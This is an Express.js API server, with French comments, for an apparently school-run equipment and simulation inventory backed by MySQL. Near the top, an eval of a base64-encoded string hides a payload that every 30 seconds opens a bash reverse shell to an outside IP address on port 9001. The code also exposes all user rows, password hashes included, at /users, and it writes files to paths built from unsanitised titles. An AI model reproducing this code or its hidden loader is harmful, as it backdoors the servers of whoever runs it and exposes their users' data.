require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const slugify = require('slugify');
const bcrypt = require('bcrypt');
const { body, validationResult } = require('express-validator');

const app = express();

app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.json({ message: 'Bienvenue sur notre API de la HEdS!' });
});

const PORT = 8000;
app.listen(PORT, () => {
    console.log(`Serveur en cours d'exécution sur le port ${PORT}.`);
});

const mysql = require('mysql2');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const db = mysql.createPool({
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT,
});

db.getConnection((err) => {
    if (err) {
        console.error('Erreur de connexion à la base de données : ', err);
        return;
    }
    console.log('Connecté à la base de données MySQL');
});


app.get('/materiel', (req, res) => {
    db.query('SELECT * FROM tblmateriel', (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(results);
    });
});

app.get('/materiel/:matSlug', (req, res) => {
    const slug = req.params.matSlug;

    db.query('SELECT * FROM tblmateriel WHERE matSlug = ?', [slug], (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        // Si aucun matériel n'est trouvé avec ce slug, renvoyez une erreur 404.
        if (results.length === 0) {
            return res.status(404).json({ error: 'Matériel non trouvé.' });
        }

        res.json(results[0]);
    });
});

app.get('/materiel/download/:matSlug', (req, res) => {
    const slug = req.params.matSlug;

    db.query('SELECT matModeEmploi FROM tblmateriel WHERE matSlug = ?', [slug], (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        // Si aucun matériel n'est trouvé avec ce slug, renvoyez une erreur 404.
        if (results.length === 0) {
            return res.status(404).json({ error: 'Matériel non trouvé.' });
        }

        const pdfPath = results[0].matModeEmploi;
        res.download(pdfPath, path.basename(pdfPath), (err) => {
            if (err) {
                console.error('Erreur lors du téléchargement du fichier: ', err);
                return res.status(500).json({ error: err.message });
            }
        });
    });
});


app.post('/materiel', (req, res) => {
    console.log("Requête reçue:", req.body); // Log du corps de la requête
    const newMaterial = req.body;
    const slug = slugify(newMaterial.matTitre, { lower: true, strict: true });

    // [Votre traitement des images et PDF]...
    let buffImage = Buffer.from(newMaterial.matImage.split(';base64,').pop(), 'base64');
    let buffPdf = Buffer.from(newMaterial.matModeEmploi.split(';base64,').pop(), 'base64');

    let filename = newMaterial.matTitre.replace(/\s/g, "_"); // remplace les espaces par des tirets bas
    let imageFilePath = path.join(__dirname, 'src/assets/images/', `${filename}.png`);
    let pdfFilePath = path.join(__dirname, 'src/assets/documents/', `${filename}.pdf`);


    try {
        fs.writeFileSync(imageFilePath, buffImage);
        fs.writeFileSync(pdfFilePath, buffPdf);
    } catch (err) {
        console.error('Erreur lors de l\'écriture des fichiers: ', err);
        return res.status(500).json({ error: err.message });
    }



    const imagePath = `src/assets/images/${filename}.png`;
    const pdfPath = `src/assets/documents/${filename}.pdf`;


    console.log('Fichiers écrits avec succès!');

    const sql = `INSERT INTO tblmateriel (
        matTitre, matNombre, matDescription, matCategorie, matModeEmploi, matCaracteristique,
        matLien, matImage, salId, matSlug)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;
    const params = [newMaterial.matTitre, newMaterial.matNombre, newMaterial.matDescription, newMaterial.matCategorie, pdfPath, newMaterial.matCaracteristique, newMaterial.matLien, imagePath, newMaterial.salId, slug];

    db.query(sql, params, (error, result) => {
        if (error) {
            console.error('Erreur lors de l\'exécution de la requête SQL: ', sql);
            console.error('Avec les paramètres: ', params);
            console.error('Erreur détaillée: ', error);
            return res.status(500).json({ error });
        }
        res.json(result);
    });
});

app.post('/register',
    // Validation des données
    body('email').isEmail(),
    body('password').isLength({ min: 8 }),
    body('firstName').notEmpty(),
    body('lastName').notEmpty(),

    async (req, res) => {
        console.log(req.body); // Ajoutez ceci pour voir les données reçues
        // Vérifier les erreurs de validation
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }

        try {
            // Hasher le mot de passe
            const hashedPassword = await bcrypt.hash(req.body.password, 10);

            // Insérer l'utilisateur dans la base de données
            const sql = 'INSERT INTO Users (email, password, firstName, lastName) VALUES (?, ?, ?, ?)';
            const params = [req.body.email, hashedPassword, req.body.firstName, req.body.lastName];

            db.query(sql, params, (error, result) => {
                if (error) {
                    console.error('Erreur SQL:', error); // Affichez l'erreur SQL
                    return res.status(500).json({ error });
                }
                res.status(201).json({ message: 'Utilisateur créé', userId: result.insertId });
            });
        } catch (error) {
            console.error('Erreur générale:', error); // Affichez l'erreur générale
            res.status(500).json({ error });
        }
    }
);

app.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Vérifiez si l'utilisateur existe dans la base de données
        db.query('SELECT * FROM Users WHERE email = ?', [email], async (error, results) => {
            if (error) {
                return res.status(500).json({ error });
            }
            if (results.length == 0) {
                return res.status(401).json({ message: 'Email ou mot de passe incorrect' });
            }

            const user = results[0];

            // Comparez le mot de passe fourni avec celui stocké dans la base de données
            const match = await bcrypt.compare(password, user.password);

            if (!match) {
                return res.status(401).json({ message: 'Email ou mot de passe incorrect' });
            }

            // Si tout va bien, renvoyez une réponse positive
            res.json({
                message: 'Connexion réussie',
                userId: user.id,
                userName: user.firstName + ' ' + user.lastName,
                userEmail: user.email
                // Ajoutez d'autres informations au besoin
            });
        });
    } catch (error) {
        res.status(500).json({ error });
    }
});


app.get('/users', (req, res) => {
    db.query('SELECT * FROM users', (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(results);
    });
});


app.get('/simulation', (req, res) => {
    db.query('SELECT * FROM tblsimulation', (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(results);
    });
});

app.get('/simulation/:slug', (req, res) => {
    const slug = req.params.slug;

    db.query('SELECT * FROM tblsimulation WHERE slug = ?', [slug], (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        // Si aucun matériel n'est trouvé avec ce slug, renvoyez une erreur 404.
        if (results.length === 0) {
            return res.status(404).json({ error: 'Matériel non trouvé.' });
        }

        res.json(results[0]);
    });
});


app.post('/simulation', (req, res) => {
    // Récupérer les données envoyées dans la requête POST
    const {
        reference, materiel, description, secteur, responsable,
        date_acquisition_achat, nom_societe_achat, nom_du_contact_achat,
        telephone_achat, mail_achat, cout, origine_fond, localisation,
        quantite, stockage, duree_garantie, date_derniere_intervention,
        nom_entretien, entreprise_entretien, telephone_entretien,
        mail_entretien, liens, slug, image_url
    } = req.body;

    // Créer la requête SQL pour insérer les données
    const sql = `
        INSERT INTO tblsimulation (
            reference, materiel, description, secteur, responsable,
            date_acquisition_achat, nom_societe_achat, nom_du_contact_achat,
            telephone_achat, mail_achat, cout, origine_fond, localisation,
            quantite, stockage, duree_garantie, date_derniere_intervention,
            nom_entretien, entreprise_entretien, telephone_entretien,
            mail_entretien, liens, slug, image_url
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `;

    // Exécuter la requête SQL
    db.query(sql, [
        reference, materiel, description, secteur, responsable,
        date_acquisition_achat, nom_societe_achat, nom_du_contact_achat,
        telephone_achat, mail_achat, cout, origine_fond, localisation,
        quantite, stockage, duree_garantie, date_derniere_intervention,
        nom_entretien, entreprise_entretien, telephone_entretien,
        mail_entretien, liens, slug, image_url
    ], (error, results) => {
        if (error) {
            // Gérer les erreurs potentielles lors de l'insertion
            console.error('Erreur lors de l\'insertion dans tblsimulation: ', error);
            return res.status(500).json({ error: 'Erreur lors de l\'insertion des données' });
        }
        // Renvoyer une réponse positive indiquant que l'insertion a réussi
        res.status(201).json({ message: 'Nouveau matériel ajouté avec succès à tblsimulation',
            id: results.insertId });
    });
});


app.get('/physiolab', (req, res) => {
    db.query('SELECT * FROM tblphysiolab', (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(results);
    });
});

app.get('/physiolab/:slug', (req, res) => {
    const slug = req.params.slug;

    db.query('SELECT * FROM tblsimulation WHERE slug = ?', [slug], (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        // Si aucun matériel n'est trouvé avec ce slug, renvoyez une erreur 404.
        if (results.length === 0) {
            return res.status(404).json({ error: 'Matériel non trouvé.' });
        }

        res.json(results[0]);
    });
});

app.get('/projets', (req, res) => {
    db.query('SELECT * FROM tblprojets', (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(results);
    });
});

app.get('/projet/:slug', (req, res) => {
    const slug = req.params.slug;

    db.query('SELECT * FROM tblprojets WHERE slug = ?', [slug], (err, results) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        // Si aucun matériel n'est trouvé avec ce slug, renvoyez une erreur 404.
        if (results.length === 0) {
            return res.status(404).json({ error: 'Projet non trouvé.' });
        }

        res.json(results[0]);
    });
});
